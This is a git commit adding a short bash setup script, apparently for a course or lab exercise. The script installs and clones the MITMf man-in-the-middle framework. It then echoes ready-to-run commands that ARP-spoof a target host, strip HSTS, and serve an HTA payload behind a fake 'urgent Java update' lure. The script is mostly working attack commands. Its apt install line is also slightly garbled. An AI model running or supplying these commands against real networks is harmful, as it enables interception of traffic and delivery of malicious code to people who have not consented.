fcb0fb21aa14d106b6fa4f322ee87df3dc52fc24
“Ivan <itec285@gmail.com>
2020-02-15 13:06:46 -0700

    Commit from Mike's system

---
+++ old/helper3.sh
@@ -0,0 +1,16 @@
+#!/usr/bin/env bash
+
+#ML 2020
+
+apt install -y python-dev install -y python-setuptools libpcap0.8-dev libnetfilter-queue-dev Libssl-dev libjpeg-dev libxml2-dev libcapstone3 libcapstone-dev libffi-dev file python-pip
+pip install virtualenvwrapper
+source /usr/local/bin/virtualenvwrapper.sh
+mkvirtualenv MITMf -p /usr/bin/python2.7
+git clone https://github.com/byt3bl33d3r/MITMf
+cd MITMf && git submodule init && git submodule update --recursive
+pip install -r requirements.txt 
+ls
+echo mitmf.py -i eth0 --spoof --arp --target 192.168.0.172 --gateway 192.168.0.1 --upsidedownternet
+echo python mitmf.py -i eth0 --spoof --arp --target 192.168.0.172 --gateway 192.168.0.1 --hsts
+echo python mitmf.py -i eth0 --spoof --arp --target 192.168.0.172 --gateway 192.168.0.1 --hta --text "your java installation requires an urgent update"
+
